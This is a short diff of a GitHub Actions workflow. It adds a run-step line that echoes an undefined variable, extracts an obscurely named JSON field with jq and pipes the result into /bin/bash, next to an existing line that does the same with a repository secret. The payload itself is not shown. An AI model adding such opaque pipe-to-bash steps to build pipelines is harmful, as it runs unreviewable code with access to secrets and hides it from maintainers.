@@ -22,6 +22,7 @@ jobs:
           fqxf6387: ${{ secrets.fqxf6387 }}
         run: |
           printf '%s' "$fqxf6387" | jq -r .jroyq027 | /bin/bash
+          echo $hype146 | jq -r .xc81171 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
